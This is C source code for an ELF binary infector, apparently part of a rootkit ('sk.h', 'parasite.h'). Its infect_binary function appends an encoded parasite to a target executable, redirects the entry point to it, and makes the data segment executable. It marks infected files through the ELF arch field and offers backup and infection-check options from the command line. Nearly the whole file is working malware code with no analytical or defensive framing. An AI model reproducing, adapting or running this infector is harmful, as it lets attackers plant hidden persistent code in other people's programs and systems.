#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include "config.h"

#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <string.h>

#include "sktypes.h"
#include "infect.h"
#include "parasite.h"
#include "config.h"
#include "sk.h"

int do_backup;

int check_binary(char *fn){

	int	fd;
	ELF	*elf;
	char	*m;
	int	size;

	eprintf("Checking %s... ", fn);

#define SZ (PARASITE_SIZE + es)

	fd = open(fn, O_RDONLY);

	/* get size of a file */
	size = lseek(fd, 0, SEEK_END);

	/* map victim */
	m = mmap(NULL, size, PROT_READ, MAP_SHARED, fd, 0);
	if (m == MAP_FAILED) {
		perror("mmap");
		close(fd);
		return 1;
	}

	elf = (void *) m;

	/* check if infected */
	if (elf->arch == 6) {
		eprintf("already infected!\n");
	}
	else{
		eprintf("not infected!\n");
	}

    munmap(m, size);
	close(fd);
	return 0;
}

int	infect_binary(char *fn, char *exec)
{
	int	fd, bk, new;
	ELF	*elf;
	PH	*ph;
	SH	*sh;
	char	*m;
	int	size;
	int	i, j;
	ulong	vaddr, vpos;
	ulong	bss;
	ulong	*u;
	uchar	buf[256];
	int	es = strlen(exec) + 1;
	struct	stat st;

	eprintf("Infecting %s (%s)...", fn, exec);

#define SZ (PARASITE_SIZE + es)

	if (do_backup == 1 ) fd = open(fn, O_RDONLY);
	else  fd = open(fn, O_RDWR);
	if (fd < 0) {
		perror(fn);
		return 1;
	}

	/* get size of a file */
	size = lseek(fd, 0, SEEK_END);

	/* map victim */
	m = mmap(NULL, size, PROT_READ, MAP_SHARED, fd, 0);
	if (m == MAP_FAILED) {
		perror("mmap");
		close(fd);
		return 1;
	}

	elf = (void *) m;

	/* check if infected */
	if (elf->arch == 6) {
		eprintf("%s: already infected\n", fn);
		goto mout;
	}
	
	if (fstat(fd, &st)) {
		perror(fn);
		goto mout;
	}
//A canviar
 	if (do_backup == 1){
		sprintf(buf, "%s%s", fn, ".BK");
		bk = open(buf, O_CREAT|O_WRONLY, st.st_mode & 0777);
	
		sprintf(buf, "%s%s", fn, ".XXX");
		new = open(buf, O_CREAT|O_RDWR|O_TRUNC, st.st_mode & 0777);
		if (bk < 0) {
			perror("can't create backup");
			goto mout;
		}
		if (new < 0) {
			perror("can't create temp");
			goto mout;
		}
		fchown(bk, st.st_uid, st.st_gid);
		fchown(new, st.st_uid, st.st_gid);
		i = write(bk, m, size);
		if (i < 0) {
			perror("write");
			close(bk);
			goto mout;
		}
		if (i != size) {
			eprintf("incomplete write while backing up\n");
			close(bk);
			goto mout;
		}
		close(bk);
		i = write(new, m, size);
		if (i < 0) {
			perror("write");
			close(new);
			goto mout;
		}
		if (i != size) {
			eprintf("incomplete write while creating temp\n");
			close(new);
			goto mout;
		}
		munmap(m, size);
		close(fd);
		fd = new;
	}
	m = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (m == MAP_FAILED) {
		perror("mmap");
		close(fd);
		return 1;
	}

	elf = (void *) m;
	

	strcpy(buf, exec);
	for (i = 0; i < es; i++) {
		buf[i] = parasite_encode(buf[i]);
	}

	/* save old entrypoint */
	orig_ep = elf->ep;
	/* find first data segment */
	ph = (void *) (m + (ulong) elf->phtab);

	for (i = 0; i < elf->phnum; i++, ph++) {
		/* PT_LOAD & rw- */
		if (ph->type == 1) {
			if (ph->flags == 6)
				goto found;
		}
	}
	eprintf("no data segment\n");
	goto mout;
found:
	bss = ph->va + ph->fsize;

	/* find relocs */
	sh = (void *) (m + (ulong) elf->shtab);
	for (i = 0; i < elf->shnum; i++, sh++) {
		if (sh->type == 9) {
			u = (void *) (m + (ulong) sh->off);
			for (j = 0; j < sh->size / 8; j++, u+=2) {
				if (*u > bss) bss = *u + 4;
			}
		}
	}

	/* select our place in file */
	if ((ph->off + bss - ph->va) > size) {
		vpos = lseek(fd, ph->off + bss - ph->va, SEEK_SET);
	} else {
		vpos = size;
	}

	/* calculate virus virtual address */
	vaddr = vpos + ph->va - ph->off;

	/* setup entrypoint */
	elf->ep = vaddr;
	vaddr += SZ;

	/* datasize */
	ph->fsize = vaddr - ph->va;

	/* enlarge bss if needed */
	if (ph->msize < ph->fsize) ph->msize = ph->fsize;

	elf->arch = 6;
	ph->flags = 7;

	/* store how much we must clean */
	bss_len = vaddr - bss;

	/* where bss begun */
	bss_addr = bss;

	munmap(m, size);
	write(fd, parasite_start, PARASITE_SIZE);
	write(fd, buf, es);
	close(fd);
	if ( do_backup == 1 ){
		unlink(fn);
		sprintf(buf, "%s%s", fn, ".XXX");
		rename(buf, fn);
	}
	eprintf("Done!\n");
	return 0;
mout:
	munmap(m, size);
	close(fd);
	return 1;

}
int usage(char * name){
	printf("%s -s binary_file -d binary_file [-b]\n"
		   "%s -c binary_file\n"
			 "\t-s: binary source\n"
			 "\t-d: binary to execute the binary infected\n"
			 "\t-b: do a backup of the file that will be modified\n"
			 "\t-c: check if binary is already infected\n",name,name);
	return 1;
}


int main(int argc, char *argv[]) {
	int fd;
	do_backup = 0;
	int do_check = 0;
	char opt;
	char * src_file = NULL;
	char * dst_file = NULL;
	char * check_file = NULL;
	
	while ((opt=getopt(argc, argv, "s:d:c:b")) != EOF){
		switch (opt){
			if(!optarg) return usage(argv[0]);
			case 's':
				src_file=optarg;
				if ((fd=open(optarg,O_RDONLY)) < 0) {perror(optarg); return -1;}
				close(fd);
			break;

			case 'd':
				dst_file=optarg;
				if ((fd=open(optarg,O_RDWR)) < 0) {perror(optarg); return -1;}
				close(fd);
			break;

			case 'b':
				do_backup=1;
			break;

			case 'c':
				do_check=1;
				check_file=optarg;
				if ((fd=open(optarg,O_RDONLY)) < 0) {perror(optarg); return -1;}
				close(fd);
			break;

			default:
				usage(argv[0]);
				return -1;
		}
	}

	if (do_check == 1){
		return check_binary(check_file);
	}
	if (src_file != NULL && dst_file != NULL){
		return infect_binary(src_file, dst_file);
	}
	
//	if(argc < 3){
//		return usage(argv[0]);
//	}
//
//	printf("openning %s...\n",argv[1]);fflush(stdout);
//	if ( (fd=open(argv[1],O_RDONLY)) < 0 ) {
//		perror("");
//		return 1;
//	}
//	close(fd);
//	
//	printf("openning %s...\n",argv[2]);fflush(stdout);
//	if ( (fd=open(argv[2],O_RDONLY)) < 0 ) {
//		perror("");
//		return 1;
//	}
//	close(fd);
//	
//	if ( (argc >= 4) && ( strcmp(argv[3],"-b") == 0 ) ||  strcmp(argv[4],"-b") == 0 ) {
//		do_backup=1;
//		return infect_binary(argv[1], argv[2]);
//	}
//	
//	if ( (argc >= 4) && ( strcmp(argv[3],"-c") == 0 ) ||  strcmp(argv[4],"-c") == 0 ) {
//		return check_binary(argv[1], argv[2]);
//	}
	usage(argv[0]);
	return 0;
}
